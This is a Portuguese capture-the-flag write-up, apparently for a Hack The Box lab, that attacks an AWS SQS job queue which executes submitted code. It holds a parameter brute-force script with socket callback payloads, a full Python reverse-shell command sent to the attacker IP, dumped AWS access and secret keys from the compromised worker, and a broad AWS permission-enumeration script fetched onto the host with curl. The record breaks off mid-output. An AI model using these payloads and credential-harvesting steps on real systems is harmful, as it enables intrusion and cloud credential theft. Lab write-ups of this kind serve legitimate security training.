O campo `runtime` praticamente grita que existe algum outro campo carregando o código a ser executado, só não sabemos o nome dele ainda. Precisamos descobrir como mandar o comando.
```python
#!/usr/bin/env python3
"""SQS Parameter Brute Force - Versão corrigida com profile."""

import boto3
import json
from datetime import datetime
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
import time

QUEUE_URL = "http://aws.nimbus.htb/847219365028/nimbus-jobs"
ENDPOINT_URL = "http://aws.nimbus.htb"
ATTACKER_IP = "10.10.16.94"
PORT = 1337

PARAMS_TO_TEST = [
    "code", "command", "cmd", "payload", "function",
    "handler", "entrypoint", "main", "execute", "exec",
    "shell", "script", "bash", "sh", "powershell", "ps1",
    "template", "config", "data", "body", "content",
    "callback", "url", "action", "method", "task"
]

found_params = []

def callback_server():
    server = socket(AF_INET, SOCK_STREAM)
    server.setsockopt(1, 1, 1)
    server.bind((ATTACKER_IP, PORT))
    server.listen(50)
    print(f"[SERVER] Listening on {ATTACKER_IP}:{PORT}")
    while True:
        try:
            conn, addr = server.accept()
            data = conn.recv(1024).decode().strip()
            if "EXECUTED:" in data:
                param_name = data.split("EXECUTED:")[1]
                print(f"\n{'='*60}")
                print(f"[✓] PARAMETER FOUND: '{param_name}'")
                print(f"    From: {addr[0]}:{addr[1]}")
                print(f"    Time: {datetime.now()}")
                print(f"{'='*60}\n")
                found_params.append(param_name)
            conn.close()
        except Exception as e:
            if "timed out" not in str(e):
                print(f"[SERVER ERROR] {e}")

def main():
    server_thread = Thread(target=callback_server, daemon=True)
    server_thread.start()

    # CORREÇÃO: usar session com o profile 'nimbus'
    session = boto3.Session(profile_name="nimbus")
    sqs = session.client("sqs", endpoint_url=ENDPOINT_URL, region_name="us-east-1")

    print(f"[*] Starting parameter brute force at {datetime.now()}")
    print(f"[+] Target: {QUEUE_URL}")
    print(f"[+] Attacker IP:{PORT}\n")

    for param in PARAMS_TO_TEST:
        try:
            payload = f"""import socket; s=socket.socket();
s.connect(("{ATTACKER_IP}", {PORT}));
s.send(b"EXECUTED:{param}\\n");
s.close()"""

            message_body = {
                "name": f"test-{param}",
                "runtime": "python3.11",
                "schedule": "* * * * *"
            }
            message_body[param] = payload

            response = sqs.send_message(
                QueueUrl=QUEUE_URL,
                MessageBody=json.dumps(message_body)
            )
            print(f"[+] Sent: '{param}' -> {response['MessageId']}")

        except Exception as e:
            print(f"[-] Failed '{param}': {e}")

    print("\n[*] Waiting for callbacks...")
    time.sleep(300)

    print("\n" + "=" * 60)
    print("              RESULTADOS FINAIS")
    print("=" * 60)
    if found_params:
        print(f"\n[✓] {len(found_params)} parâmetros executáveis encontrados:\n")
        for i, param in enumerate(found_params, 1):
            print(f"{i}. '{param}'\n")
    else:
        print("\n[✗] Nenhum parâmetro executável encontrado\n")

if __name__ == "__main__":
    main()
```
```python
──(venv)─(root㉿barroboy)-[/home/HTB/labs/nimbus]
└─# python3 find_parameter.py
[SERVER] Listening on 10.10.16.94:1337
[*] Starting parameter brute force at 2026-06-22 01:52:01.374280
[+] Target: http://aws.nimbus.htb/847219365028/nimbus-jobs
[+] Attacker IP:1337

[+] Sent: 'code' -> e3a9abc8-8070-4281-96f5-945d6961abde
[+] Sent: 'command' -> bede2d23-81cd-4956-bd6e-bac5bba0933d
[+] Sent: 'cmd' -> 5c739145-d9b8-4304-8db4-83ba23a5342f
[+] Sent: 'payload' -> bda0c66f-9387-4a49-b610-b021a84748e9
[+] Sent: 'function' -> 9718f690-6690-499b-ad6e-192eeed6b641
[+] Sent: 'handler' -> dbfbd755-9657-4820-a52e-4916b154d440
[+] Sent: 'entrypoint' -> 5aeb4e96-639b-44c0-8b68-fc1007d4f07f
[+] Sent: 'main' -> c1ab868d-8cf0-4018-a3e0-22d5a2d5bae8
[+] Sent: 'execute' -> 86d8d117-33f6-4958-8ed4-0ef7d0d15001
[+] Sent: 'exec' -> 10e8ebb2-fc5b-41a9-b89a-92c9bfe83f36
[+] Sent: 'shell' -> 1b54cd61-88b8-4a2c-a937-a23994389a3c
[+] Sent: 'script' -> 6b0447cd-c392-4e89-ab05-f5473318dc67

============================================================
[✓] PARAMETER FOUND: 'script'
    From: 10.129.18.226:56196
    Time: 2026-06-22 01:52:07.379026
============================================================

[+] Sent: 'bash' -> 11254591-3ad5-46c3-8207-56313e42ca68
[+] Sent: 'sh' -> 3690452a-50d4-416b-ae31-37daa4e9588b
[+] Sent: 'powershell' -> d1cb7fa6-05c6-4592-962e-43400381354a
[+] Sent: 'ps1' -> 8fe89223-8fc4-43f8-a0cd-bfe14fb3f7f3
[+] Sent: 'template' -> 30a2c8c1-263a-4186-b4c8-0d24dbc19187
[+] Sent: 'config' -> 3e9c08d4-384e-460c-a7e7-f0d1cfe276d5
[+] Sent: 'data' -> fdf50f0f-b02f-418d-bfc4-bfe116bde31b
[+] Sent: 'body' -> 508a6f98-1ca8-452d-926c-b00546cb728e
[+] Sent: 'content' -> 67fb8a03-7d09-4c65-820c-2b6ade93841a
[+] Sent: 'callback' -> 6e9f39e8-fe45-45f5-8756-96a063336b04
[+] Sent: 'url' -> cd72983e-9c25-4252-a690-859fcdf60f2c
[+] Sent: 'action' -> 0ab92994-55cd-4009-aa86-a037587287c8
[+] Sent: 'method' -> cf8e1c38-dedb-418d-bcc0-264bd8cf3dd6
[+] Sent: 'task' -> c56b910f-6efb-4267-8809-4d23685ae24f

```
Encontramos
```python
aws sqs --endpoint-url http://aws.nimbus.htb send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body '{
    "name": "tty-shell",
    "runtime": "python3.11",
    "schedule": "* * * * *",
    "script": "import socket,subprocess,os,pty;s=socket.socket();s.connect((\"10.10.16.94\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"
  }' \
  --profile nimbus

```
```python
connect to [10.10.16.94] from (UNKNOWN) [10.129.18.209] 49704
worker@7b501f11b98e:/app$ env
env
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
HOSTNAME=7b501f11b98e
PYTHON_VERSION=3.11.15
AWS_DEFAULT_REGION=us-east-1
PWD=/app
HOME=/home/worker
LANG=C.UTF-8
LS_COLORS=
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
SHLVL=1
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```
Agora é escalar. Com esse env, encontramos novas chaves da aws. Vamos enumerar o que dá para fazer:
```python
import boto3
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ACCOUNT_ID = "847219365028"

session_kwargs = {
    "aws_access_key_id": "AKIA7P3R9X4K8M2L5VHN",
    "aws_secret_access_key": "dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh",
    "region_name": REGION,
}

session = boto3.Session(**session_kwargs)

# Mais abrangente que o anterior — testa ações que podem escalar privilégio
checks = [
    # SQS
    ("sqs", "list_queues", {}),
    ("sqs", "get_queue_attributes", {"QueueUrl": f"http://{ENDPOINT.replace('http://', '')}/{ACCOUNT_ID}/nimbus-jobs", "AttributeNames": ["All"]}),
    ("sqs", "send_message", {"QueueUrl": f"http://{ENDPOINT.replace('http://', '')}/{ACCOUNT_ID}/nimbus-jobs", "MessageBody": '{"test": true}'}),

    # S3
    ("s3", "list_buckets", {}),
    ("s3", "list_objects", {"Bucket": "nimbus-assets"}),
    ("s3", "list_objects", {"Bucket": "nimbus-backup"}),
    ("s3", "list_objects", {"Bucket": "floci-bucket"}),

    # Lambda
    ("lambda", "list_functions", {}),
    ("lambda", "list_event_source_mappings", {}),
    ("lambda", "list_layer_versions", {"LayerName": "nimbus-layer"}),
    ("lambda", "list_layer_versions", {"LayerName": "worker-layer"}),

    # CodeBuild
    ("codebuild", "list_projects", {}),
    ("codebuild", "list_builds_for_project", {"projectName": "nimbus-worker"}),
    ("codebuild", "list_builds_for_project", {"projectName": "nimbus-build"}),
    ("codebuild", "batch_get_builds", {"ids": ["nimbus-worker:latest"]}),

    # IAM
    ("iam", "list_users", {}),
    ("iam", "list_roles", {}),
    ("iam", "list_policies", {}),
    ("iam", "list_instance_profiles", {}),
    ("iam", "list_groups", {}),

    # STS
    ("sts", "get_caller_identity", {}),

    # EC2
    ("ec2", "describe_instances", {}),
    ("ec2", "describe_security_groups", {}),
    ("ec2", "describe_key_pairs", {}),
    ("ec2", "describe_images", {"Owners": ["self"]}),

    # Secrets Manager
    ("secretsmanager", "list_secrets", {}),

    # SSM
    ("ssm", "describe_parameters", {}),
    ("ssm", "get_parameters_by_path", {"Path": "/"}),

    # DynamoDB
    ("dynamodb", "list_tables", {}),

    # ECS
    ("ecs", "list_clusters", {}),
    ("ecs", "list_task_definitions", {}),
    ("ecs", "list_services", {"cluster": "nimbus"}),
    ("ecs", "list_container_instances", {"cluster": "nimbus"}),

    # ECR
    ("ecr", "describe_repositories", {}),
    ("ecr", "list_images", {"repositoryName": "nimbus-worker"}),
    ("ecr", "list_images", {"repositoryName": "floci/floci"}),

    # KMS
    ("kms", "list_keys", {}),
    ("kms", "list_aliases", {}),

    # CloudFormation
    ("cloudformation", "list_stacks", {}),
    ("cloudformation", "describe_stacks", {}),

    # SNS
    ("sns", "list_topics", {}),
    ("sns", "list_subscriptions", {}),

    # CloudWatch Logs
    ("logs", "describe_log_groups", {}),
    ("logs", "describe_log_streams", {"logGroupName": "/aws/codebuild/nimbus-worker"}),
    ("logs", "describe_log_streams", {"logGroupName": "/aws/lambda/nimbus-worker"}),

    # Route53
    ("route53", "list_hosted_zones", {}),

    # Cognito
    ("cognito-idp", "list_user_pools", {"MaxResults": 10}),
    ("cognito-identity", "list_identity_pools", {"MaxResults": 10}),

    # API Gateway
    ("apigateway", "get_rest_apis", {}),
    ("apigatewayv2", "get_apis", {}),

    # CloudFront / CloudFront KeyValueStore
    ("cloudfront", "list_distributions", {}),

    # EKS - Elastic Kubernetes Service
    ("eks", "list_clusters", {}),

    # Step Functions
    ("stepfunctions", "list_state_machines", {}),

    # SQS mais específicos
    ("sqs", "list_dead_letter_source_queues", {"QueueUrl": f"http://{ENDPOINT.replace('http://', '')}/{ACCOUNT_ID}/nimbus-jobs"}),

    # Systems Manager
    ("ssm", "describe_instance_information", {}),
    ("ssm", "list_command_invocations", {}),

    # Auto Scaling
    ("autoscaling", "describe_auto_scaling_groups", {}),
    ("autoscaling", "describe_launch_configurations", {}),

    # ELB
    ("elb", "describe_load_balancers", {}),
    ("elbv2", "describe_load_balancers", {}),

    # CloudTrail
    ("cloudtrail", "describe_trails", {}),
]

def test_service(service, method, kwargs):
    try:
        client = session.client(service, endpoint_url=ENDPOINT)
        result = getattr(client, method)(**kwargs)
        result_str = json.dumps(result, default=str, indent=2)
        # Truncate long results
        if len(result_str) > 800:
            result_str = result_str[:800] + "... [truncated]"
        return (service, method, "ALLOWED", result_str, None)
    except Exception as e:
        msg = str(e)
        if "AccessDenied" in msg or "not authorized" in msg:
            return (service, method, "DENIED", None, msg[:120])
        elif "404" in msg or "NoSuchBucket" in msg or "ResourceNotFoundException" in msg:
            return (service, method, "NOT_FOUND", None, msg[:120])
        elif "ValidationError" in msg or "Parameter" in msg:
            return (service, method, "PARAM_ERROR", None, msg[:120])
        else:
            return (service, method, "OTHER_ERR", None, msg[:120])

print("=" * 100)
print("  NIMBUS AWS ENUMERATION - floci:4566")
print(f"  Role: arn:aws:sts::{ACCOUNT_ID}:assumed-role/nimbus-worker-role/worker")
print("=" * 100)

results = {"ALLOWED": [], "DENIED": [], "NOT_FOUND": [], "PARAM_ERROR": [], "OTHER_ERR": []}

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(test_service, s, m, k): (s, m) for s, m, k in checks}
    for future in as_completed(futures):
        svc, method, status, data, err = future.result()
        results[status].append((svc, method, data, err))

print(f"\n{'='*100}")
print(f"  ✅ ALLOWED ({len(results['ALLOWED'])}):")
print(f"{'='*100}")
for svc, method, data, _ in sorted(results["ALLOWED"]):
    print(f"\n  [+] {svc}.{method}")
    print(f"      {data[:500]}")

if results["DENIED"]:
    print(f"\n{'='*100}")
    print(f"  ❌ DENIED ({len(results['DENIED'])}):")
    print(f"{'='*100}")
    for svc, method, _, err in sorted(results["DENIED"]):
        print(f"  [-] {svc}.{method} -> {err}")

if results["NOT_FOUND"]:
    print(f"\n{'='*100}")
    print(f"  ⚠  NOT FOUND ({len(results['NOT_FOUND'])}):")
    print(f"{'='*100}")
    for svc, method, _, err in sorted(results["NOT_FOUND"]):
        print(f"  [?] {svc}.{method} -> {err}")

if results["OTHER_ERR"]:
    print(f"\n{'='*100}")
    print(f"  🔍 OTHER ERRORS ({len(results['OTHER_ERR'])}):")
    print(f"{'='*100}")
    for svc, method, _, err in sorted(results["OTHER_ERR"]):
        print(f"  [!] {svc}.{method} -> {err}")

print(f"\n{'='*100}")
print("  DONE")
print(f"{'='*100}")

```
```python
kali@barroboy:~$ rlwrap -cAr nc -klnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.94] from (UNKNOWN) [10.129.18.226] 48138
worker@4306f21d6fa5:/app$ curl -o brute.py http://10.10.16.94:8087/brute.py
curl -o brute.py http://10.10.16.94:8087/brute.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6841  100  6841    0     0   6008      0  0:00:01  0:00:01 --:--:--  6011
worker@4306f21d6fa5:/app$ ls
ls
brute.py  requirements.txt  worker.py
worker@4306f21d6fa5:/app$ python3 brute.py
python3 brute.py
====================================================================================================
  NIMBUS AWS ENUMERATION - floci:4566
  Role: arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker
====================================================================================================

====================================================================================================
  ✅ ALLOWED (49):
====================================================================================================

  [+] apigateway.get_rest_apis
      {
  "ResponseMetadata": {
    "RequestId": "0375e798-5293-4745-834d-5193516e5050",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "11",
      "content-type": "application/json",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "0375e798-5293-4745-834d-5193516e5050",
      "x-amz-request-id": "0375e798-5293-4745-834d-5193516e5050",
      "x-amzn-requestid": "0375e798-5293-4745-834d-5193516e5050"
    },
    "RetryAttempts": 0
  },
  "items": []
}

  [+] apigatewayv2.get_apis
      {
  "ResponseMetadata": {
    "RequestId": "08eb12f2-de2e-4caa-b8a3-6a86a11a9526",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "12",
      "content-type": "application/json",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "08eb12f2-de2e-4caa-b8a3-6a86a11a9526",
      "x-amz-request-id": "08eb12f2-de2e-4caa-b8a3-6a86a11a9526",
      "x-amzn-requestid": "08eb12f2-de2e-4caa-b8a3-6a86a11a9526"
    },
    "RetryAttempts": 0
  },
  "Items": []
}

  [+] autoscaling.describe_auto_scaling_groups
      {
  "AutoScalingGroups": [],
  "ResponseMetadata": {
    "RequestId": "942194ea-0ac6-4a8a-a5ef-ffea0c9634c8",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "331",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "50f57683-4625-426f-a034-6d8f34f6fcac",
      "x-amz-request-id": "50f57683-4625-426f-a034-6d8f34f6fcac",
      "x-amzn-requestid": "50f57683-4625-426f-a034-6d8f34f6fcac"
    },
    "RetryAttempts": 0


  [+] autoscaling.describe_launch_configurations
      {
  "LaunchConfigurations": [],
  "ResponseMetadata": {
    "RequestId": "09820565-e6a8-4f7c-9206-c439defd1922",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "349",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "05562abd-4dd6-431e-addc-ed755137cf06",
      "x-amz-request-id": "05562abd-4dd6-431e-addc-ed755137cf06",
      "x-amzn-requestid": "05562abd-4dd6-431e-addc-ed755137cf06"
    },
    "RetryAttempts": 0

  [+] cloudformation.describe_stacks
      {
  "Stacks": [],
  "ResponseMetadata": {
    "RequestId": "f737a92c-3769-454a-a341-1b0adc93dcc0",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "267",
      "content-type": "text/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "418cb9ef-337a-448e-9786-d19ba9170f44",
      "x-amz-request-id": "418cb9ef-337a-448e-9786-d19ba9170f44",
      "x-amzn-requestid": "418cb9ef-337a-448e-9786-d19ba9170f44"
    },
    "RetryAttempts": 0
  }
}

  [+] cloudformation.list_stacks
      {
  "StackSummaries": [],
  "ResponseMetadata": {
    "RequestId": "4b3e1916-fd15-48a7-a911-64149242c4c2",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "267",
      "content-type": "text/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "e43068e9-81fd-4f60-b28b-e7c647e9512a",
      "x-amz-request-id": "e43068e9-81fd-4f60-b28b-e7c647e9512a",
      "x-amzn-requestid": "e43068e9-81fd-4f60-b28b-e7c647e9512a"
    },
    "RetryAttempts": 0
  }
}

  [+] codebuild.batch_get_builds
      {
  "builds": [],
  "buildsNotFound": [
    "nimbus-worker:latest"
  ],
  "ResponseMetadata": {
    "RequestId": "eb962ebe-4827-4a3b-a018-5cf6b79e3e85",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "55",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "eb962ebe-4827-4a3b-a018-5cf6b79e3e85",
      "x-amz-request-id": "eb962ebe-4827-4a3b-a018-5cf6b79e3e85",
      "x-amzn-requestid": "eb9

  [+] codebuild.list_builds_for_project
      {
  "ids": [],
  "ResponseMetadata": {
    "RequestId": "39c9fb2b-2493-4b35-9c9b-d1577169f7d8",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "10",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "39c9fb2b-2493-4b35-9c9b-d1577169f7d8",
      "x-amz-request-id": "39c9fb2b-2493-4b35-9c9b-d1577169f7d8",
      "x-amzn-requestid": "39c9fb2b-2493-4b35-9c9b-d1577169f7d8"
    },
    "RetryAttem

  [+] codebuild.list_builds_for_project
      {
  "ids": [],
  "ResponseMetadata": {
    "RequestId": "b81b495b-f696-4f50-a8be-111f9db6a2a3",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "10",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "b81b495b-f696-4f50-a8be-111f9db6a2a3",
      "x-amz-request-id": "b81b495b-f696-4f50-a8be-111f9db6a2a3",
      "x-amzn-requestid": "b81b495b-f696-4f50-a8be-111f9db6a2a3"
    },
    "RetryAttem

  [+] codebuild.list_projects
      {
  "projects": [],
  "ResponseMetadata": {
    "RequestId": "d8a8090a-c74a-4adf-8dbe-4d050d5fab4c",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "15",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "d8a8090a-c74a-4adf-8dbe-4d050d5fab4c",
      "x-amz-request-id": "d8a8090a-c74a-4adf-8dbe-4d050d5fab4c",
      "x-amzn-requestid": "d8a8090a-c74a-4adf-8dbe-4d050d5fab4c"
    },
    "Retry

  [+] cognito-idp.list_user_pools
      {
  "UserPools": [],
  "ResponseMetadata": {
    "RequestId": "c6d2372e-23ef-42ea-b793-8ba8cbd039b9",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "16",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "c6d2372e-23ef-42ea-b793-8ba8cbd039b9",
      "x-amz-request-id": "c6d2372e-23ef-42ea-b793-8ba8cbd039b9",
      "x-amzn-requestid": "c6d2372e-23ef-42ea-b793-8ba8cbd039b9"
    },
    "Retr

  [+] dynamodb.list_tables
      {
  "TableNames": [],
  "ResponseMetadata": {
    "RequestId": "59bcf56b-1ea0-4e03-872a-9b7981c5cb53",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "17",
      "content-type": "application/x-amz-json-1.0",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-crc32": "1315925753",
      "x-amz-id-2": "59bcf56b-1ea0-4e03-872a-9b7981c5cb53",
      "x-amz-request-id": "59bcf56b-1ea0-4e03-872a-9b7981c5cb53",
      "x-amzn-requestid": "59bcf56b-1ea0-4e03-872a-9b7981c5

  [+] ec2.describe_images
      {
  "Images": [
    {
      "Architecture": "x86_64",
      "CreationDate": "2023-04-04T00:00:00.000Z",
      "ImageId": "ami-0abcdef1234567890",
      "ImageLocation": "amazon/amzn2-ami-hvm-2.0.20230404.0-x86_64-gp2",
      "ImageType": "machine",
      "Public": true,
      "OwnerId": "amazon",
      "State": "available",
      "Description": "Amazon Linux 2 AMI",
      "Hypervisor": "xen",
      "ImageOwnerAlias": "amazon",
      "Name": "amzn2-ami-hvm-2.0.20230404.0-x86_64-gp2",
      "RootD

  [+] ec2.describe_instances
      {
  "Reservations": [],
  "ResponseMetadata": {
    "RequestId": "73d1cb79-b366-4e1d-893a-57525d077a3e",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "196",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "5cdc13bd-a0d5-4803-a5fa-4318dcf0df36",
      "x-amz-request-id": "5cdc13bd-a0d5-4803-a5fa-4318dcf0df36",
      "x-amzn-requestid": "5cdc13bd-a0d5-4803-a5fa-4318dcf0df36"
    },
    "RetryAttempts": 0
  }
}

  [+] ec2.describe_key_pairs
      {
  "KeyPairs": [],
  "ResponseMetadata": {
    "RequestId": "67e2e5a7-9506-4f1a-9179-21d304fbcc02",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "178",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "08482725-93ca-4974-8b6a-62d3a90efcd7",
      "x-amz-request-id": "08482725-93ca-4974-8b6a-62d3a90efcd7",
      "x-amzn-requestid": "08482725-93ca-4974-8b6a-62d3a90efcd7"
    },
    "RetryAttempts": 0
  }
}

  [+] ec2.describe_security_groups
      {
  "SecurityGroups": [
    {
      "Description": "default VPC security group",
      "GroupName": "default",
      "IpPermissions": [],
      "OwnerId": "847219365028",
      "GroupId": "sg-default",
      "IpPermissionsEgress": [
        {
          "IpProtocol": "-1",
          "IpRanges": [
            {
              "CidrIp": "0.0.0.0/0"
            }
          ],
          "Ipv6Ranges": [],
          "UserIdGroupPairs": []
        }
      ],
      "Tags": [],
      "VpcId": "vpc-default"

  [+] ecr.describe_repositories
      {
  "repositories": [],
  "ResponseMetadata": {
    "RequestId": "af99c925-07fd-47ea-89be-bdf540568db3",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "19",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "af99c925-07fd-47ea-89be-bdf540568db3",
      "x-amz-request-id": "af99c925-07fd-47ea-89be-bdf540568db3",
      "x-amzn-requestid": "af99c925-07fd-47ea-89be-bdf540568db3"
    },
    "R

  [+] ecs.list_clusters
      {
  "clusterArns": [],
  "ResponseMetadata": {
    "RequestId": "6fb6f7b3-0f37-4233-8d8d-5ccb5caf01b1",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "18",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "6fb6f7b3-0f37-4233-8d8d-5ccb5caf01b1",
      "x-amz-request-id": "6fb6f7b3-0f37-4233-8d8d-5ccb5caf01b1",
      "x-amzn-requestid": "6fb6f7b3-0f37-4233-8d8d-5ccb5caf01b1"
    },
    "Re

  [+] ecs.list_task_definitions
      {
  "taskDefinitionArns": [],
  "ResponseMetadata": {
    "RequestId": "dd4befaf-52ea-4438-b48b-ccaa7f72bc3b",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/x-amz-json-1.1;charset=UTF-8",
      "content-length": "25",
      "date": "Mon, 22 Jun 2026 02:23:40 GMT",
      "x-amz-id-2": "dd4befaf-52ea-4438-b48b-ccaa7f72bc3b",
      "x-amz-request-id": "dd4befaf-52ea-4438-b48b-ccaa7f72bc3b",
      "x-amzn-requestid": "dd4befaf-52ea-4438-b48b-ccaa7f72bc3b"
    },

  [+] eks.list_clusters
      {
  "ResponseMetadata": {
    "RequestId": "e71da96b-21ff-4199-90d3-a12baa5e221b",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-type": "application/json;charset=UTF-8",
      "content-length": "15",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "e71da96b-21ff-4199-90d3-a12baa5e221b",
      "x-amz-request-id": "e71da96b-21ff-4199-90d3-a12baa5e221b",
      "x-amzn-requestid": "e71da96b-21ff-4199-90d3-a12baa5e221b"
    },
    "RetryAttempts": 0
  },
  "cluster

  [+] elb.describe_load_balancers
      {
  "NextMarker": "",
  "ResponseMetadata": {
    "RequestId": "13cb4dda-8484-4a9d-aec0-49d4f9ca5a48",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "341",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "31274f5a-5752-4cf0-8cab-56d94aeb27d7",
      "x-amz-request-id": "31274f5a-5752-4cf0-8cab-56d94aeb27d7",
      "x-amzn-requestid": "31274f5a-5752-4cf0-8cab-56d94aeb27d7"
    },
    "RetryAttempts": 0
  }
}

  [+] elbv2.describe_load_balancers
      {
  "LoadBalancers": [],
  "NextMarker": "",
  "ResponseMetadata": {
    "RequestId": "a9368e78-e64e-4f6d-a5ac-fb6e3a038497",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "341",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:41 GMT",
      "x-amz-id-2": "089d8475-8aba-45c6-a460-542907de8df1",
      "x-amz-request-id": "089d8475-8aba-45c6-a460-542907de8df1",
      "x-amzn-requestid": "089d8475-8aba-45c6-a460-542907de8df1"
    },
    "Retr

  [+] iam.list_groups
      {
  "Groups": [],
  "IsTruncated": false,
  "ResponseMetadata": {
    "RequestId": "5639c9da-6e96-4475-a0d2-2846d09e7ae9",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "273",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "da727c57-2fa8-48ee-a4bc-97ad80b63781",
      "x-amz-request-id": "da727c57-2fa8-48ee-a4bc-97ad80b63781",
      "x-amzn-requestid": "da727c57-2fa8-48ee-a4bc-97ad80b63781"
    },
    "RetryAt

  [+] iam.list_instance_profiles
      {
  "InstanceProfiles": [],
  "IsTruncated": false,
  "ResponseMetadata": {
    "RequestId": "c1d6a332-c54a-4e12-a6bd-75647dbc8086",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "333",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "8e3960a5-c3a7-4186-9ce4-d43230e5d504",
      "x-amz-request-id": "8e3960a5-c3a7-4186-9ce4-d43230e5d504",
      "x-amzn-requestid": "8e3960a5-c3a7-4186-9ce4-d43230e5d504"
    },


  [+] iam.list_policies
      {
  "Policies": [
    {
      "PolicyName": "AWSPartnerCentralSellingResourceSnapshotJobExecutionRolePolicy",
      "PolicyId": "ANPAJXDS1MJXJPIBS29V",
      "Arn": "arn:aws:iam::aws:policy/AWSPartnerCentralSellingResourceSnapshotJobExecutionRolePolicy",
      "Path": "/",
      "DefaultVersionId": "v1",
      "AttachmentCount": 0,
      "IsAttachable": true,
      "CreateDate": "2026-06-22 02:23:39.250708+00:00",
      "UpdateDate": "2026-06-22 02:23:39.250708+00:00"
    },
    {
      "PolicyN

  [+] iam.list_roles
      {
  "Roles": [],
  "IsTruncated": false,
  "ResponseMetadata": {
    "RequestId": "dbfef49c-4148-41f8-a0e0-87e76fcf2ba3",
    "HTTPStatusCode": 200,
    "HTTPHeaders": {
      "content-length": "267",
      "content-type": "application/xml",
      "date": "Mon, 22 Jun 2026 02:23:39 GMT",
      "x-amz-id-2": "7fb1be1f-a6f1-45c3-a7d0-c1d78f8a440d",
      "x-amz-request-id": "7fb1be1f-a6f1-45c3-a7d0-c1d78f8a440d",
      "x-amzn-requestid": "7fb1be1f-a6f1-45c3-a7d0-c1d78f8a440d"
    },
    "RetryAtt

  [+] iam.list_users
